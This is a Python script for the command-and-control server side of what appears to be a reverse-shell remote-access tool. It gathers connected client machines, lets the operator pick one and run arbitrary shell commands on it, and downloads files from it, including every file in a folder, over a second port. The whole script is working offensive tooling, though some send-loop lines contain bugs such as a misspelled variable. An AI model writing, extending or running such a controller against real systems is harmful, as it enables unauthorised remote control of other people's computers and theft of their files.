#!/usr/bin/env/ python

import socket, sys, threading, time, subprocess
from tabulate import tabulate

CHECKER = "<check>".encode()
SEPARATOR = "<sep>"

class Server:
	def __init__(self, host, port, buffer_size=1024, verbose=False, timeout=1):
		self.host = host
		self.port = port
		self.buffer_size = buffer_size
		self.verbose = verbose
		self.clients = {}
		self.current_client = None
		self.connections_thread = threading.Thread(target=self.accept_connection, daemon=True)
		self.connection_flag = False
		self.timeout = timeout
	def start(self):
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.settimeout(self.timeout)
		if self.verbose:
			print(f"[+] [{time.strftime('%H:%M:%S', time.localtime())}] : Socket Created Successfully as {self.host}:{self.port}")
		try:
			self.socket.bind((self.host, self.port))
			if self.verbose:
				print(f"[+] [{time.strftime('%H:%M:%S', time.localtime())}] : Server Started Successfully as {self.host}:{self.port}")
			return 0
		except:
			if self.verbose:
				print(f"[-] [{time.strftime('%H:%M:%S', time.localtime())}] : Failed to Start the Server as {self.host}:{self.port}")
			return -1
	def close(self):
		self.socket.close()
		if self.verbose:
			print(f"[+] [{time.strftime('%H:%M:%S', time.localtime())}] : Server Closed = {self.host}:{self.port}")
	def listen(self, backlog=0):
		if backlog > 0:
			self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.socket.listen(backlog)
	def accept_connection(self):
		while self.connection_flag:
			try:
				client_socket, client_address = self.socket.accept()
				self.clients[client_address] = client_socket
			except socket.timeout:
				continue
			except:
				if self.verbose:
					print(f"[-] [{time.strftime('%H:%M:%S', time.localtime())}] : Server Socket {self.host}:{self.port} Closed, Exiting!")
				break
			if self.verbose:
				print(f"[+] [{time.strftime('%H:%M:%S', time.localtime())}] : Client Connected : {client_address[0]}:{client_address[1]}")
	def accept_connections(self, flag):
		if flag:
			self.connection_flag = True
			self.connections_thread.start()
		else:
			self.connection_flag = False
			self.connections_thread.join()
	def check_connections(self):
		for i in range(2):
			disconnected_clients = []
			for client_address in self.clients.keys():
				try:
					self.clients[client_address].send(CHECKER)
				except:
					disconnected_clients.append(client_address)
					if self.verbose:
						print(f"[-] [{time.strftime('%H:%M:%S', time.localtime())}] : Connection Lost with Client = {client_address[0]}:{client_address[1]}")
			for disconnected_client in disconnected_clients:
				self.clients.pop(disconnected_client)
	def close_connection(self, client_address):
		self.clients[client_address].close()
		if self.verbose:
			print(f"[+] [{time.strftime('%H:%M:%S', time.localtime())}] : Client Closed = {client_address[0]}:{client_address[1]}")
	def close_connections(self):
		for client_address in self.clients.keys():
			self.close_connection(client_address)
	def send(self, message):
		message_size = len(message)
		packets_number = message_size//self.buffer_size
		self.clients[self.current_client].send(str(message_size).encode())
		self.clients[self.current_client].recv(self.buffer_size)
		for packet_number in range(packets_number):
			self.clients[self.current_client].send(message[packet_number*self.buffer_size:(packet_number+1)*self.buffer_size].encode())
			response = self.clients.recv(self.buffer_size).decode()
			while response == "0":
				self.clients[self.current_client].send(message[packet_number*self.buffer_size:(packet_nubmer+1)*self.buffer_size].encode())	
				response = self.clients.recv(self.buffer_size).decode()
		if message_size % self.buffer_size != 0:
			self.clients[self.current_client].send(message[-(message_size%self.buffer_size):].encode())
			response = self.clients[self.current_client].recv(self.buffer_size).decode()
			while response == "0":
				self.clients[self.current_client].send(message[-(message_size%self.buffer_size):].encode())
				response = self.clients[self.current_client].recv(self.buffer_size).decode()
	def receive(self):
		message = b""
		message_size = int(self.clients[self.current_client].recv(self.buffer_size).decode())
		packets_number = message_size//self.buffer_size
		self.clients[self.current_client].send("A".encode())
		for packet_number in range(packets_number):
			packet = self.clients[self.current_client].recv(self.buffer_size)
			while len(packet) < self.buffer_size:
				self.clients[self.current_client].send("0".encode())
				packet = self.clients[self.current_client].recv(self.buffer_size)
			self.clients[self.current_client].send("1".encode())
			message += packet
		if message_size % self.buffer_size != 0:
			packet = self.clients[self.current_client].recv(message_size%self.buffer_size)
			while len(packet) < message_size % self.buffer_size:
				self.clients[self.current_client].send("0".encode())
				packet = self.clients[self.current_client].recv(message_size%self.buffer_size)
			self.clients[self.current_client].send("1".encode())
			message += packet
		return message.decode()
class DownloadServer(Server):
	def __init__(self, host, port, buffer_size=1024, verbose=False, timeout=1):
		super().__init__(host, port, buffer_size, verbose, timeout)
	def packets(self, file_size):
		packets_number = file_size//self.buffer_size
		for packet_number in range(packets_number):
			packet = self.clients[self.current_client].recv(self.buffer_size)
			while len(packet) < self.buffer_size:
				self.clients[self.current_client].send("0".encode())
				packet = self.clients[self.current_client].recv(self.buffer_size)
			self.clients[self.current_client].send("1".encode())
			yield packet
		if file_size % self.buffer_size != 0:
			packet = self.clients[self.current_client].recv(file_size % self.buffer_size)
			while len(packet) < file_size % self.buffer_size:
				self.clients[self.current_client].send("0".encode())
				packet = self.clients[self.current_client].recv(file_size % self.buffer_size)
			self.clients[self.current_client].send("1".encode())
			yield packet
	def startServer(self, client_address, server):
		status = self.start()
		if status == 0:
			server.send("1")
			self.listen()
			self.accept_connections(True)
			f = 0
			while True:
				clients = self.clients.keys()
				for addr, port in clients:
					if client_address == addr:
						client_address = (addr, port)
						f = 1
						break
				if f:
					break
			self.accept_connections(False)
			self.current_client = client_address
		else:
			server.send("0")
		return status
	def downloadFile(self, file_name):
		self.send(file_name)
		try:
			file_size = int(self.clients[self.current_client].recv(self.buffer_size).decode())
		except ValueError:
			if self.verbose:
				print(f"[+] [{time.strftime('%H:%M:%S', time.localtime())}] : File not Found! ")
			return -1
		with open(file_name, 'wb') as f:
			self.clients[self.current_client].send("A".encode())
			data_received = 0
			for packet in self.packets(file_size):
				f.write(packet)
				current_data_len = len(packet)
				data_received += current_data_len
			print(f"[+]  [{time.strftime('%H:%M:%S', time.localtime())}] : File Downloaded = {file_name}")
		return 0
	def closeServer(self):
		self.close_connections()
		self.close()

def shell(server):
	command = ""
	while command != "exit":
		command = input(f"[{server.host}:{server.port}] $> ")
		if command == "list":
			print("\n"+tabulate(server.clients.keys(), headers=["IP", "PORT"])+"\n")
		if command.startswith("use"):
			client = command.split(" ")[1].split(":")
			server.current_client = (client[0], int(client[1]))
			client_command = ""
			server.send("READY")
			cwd = server.receive()
			while client_command != "exit":
				print()
				client_command = input(f"{client[0]}:{client[1]} : {cwd}  $> ")
				print()
				if client_command.startswith("download"):
					server.send(client_command)
					file_name = client_command[9:]
					if file_name == "*":
						file_names = server.receive().split(",")
					else:
						try:
							file_names = file_name.split(", ")
						except:
							file_names = [file_name]
					downloadServer = DownloadServer(server.host, server.port+1, server.buffer_size, server.verbose, server.timeout)
					status = downloadServer.startServer(server.current_client[0], server)
					if status == -1:
						continue
					for files in file_names:
						downloadServer.downloadFile(files)
					downloadServer.closeServer()
					continue
				if client_command.startswith("local"):
					local_command = client_command[6:]
					subprocess.call(local_command)
					continue
				server.send(client_command)
				response = server.receive().split(SEPARATOR)
				cwd = response[1]
				print(response[0])
		if command == "check":
			server.check_connections()
def main(host, port, buffer_size, timeout):
	server = Server(host, port, buffer_size, verbose=True, timeout=timeout)
	server.start()
	server.listen()
	server.accept_connections(True)
	shell(server)
	server.accept_connections(False)
	server.close_connections()
	server.close()

if __name__ == "__main__":
	SERVER_HOST = sys.argv[1]
	SERVER_PORT = int(sys.argv[2])
	BUFFER_SIZE = int(sys.argv[3])
	TIMEOUT = int(sys.argv[4])
	main(SERVER_HOST, SERVER_PORT, BUFFER_SIZE, TIMEOUT)
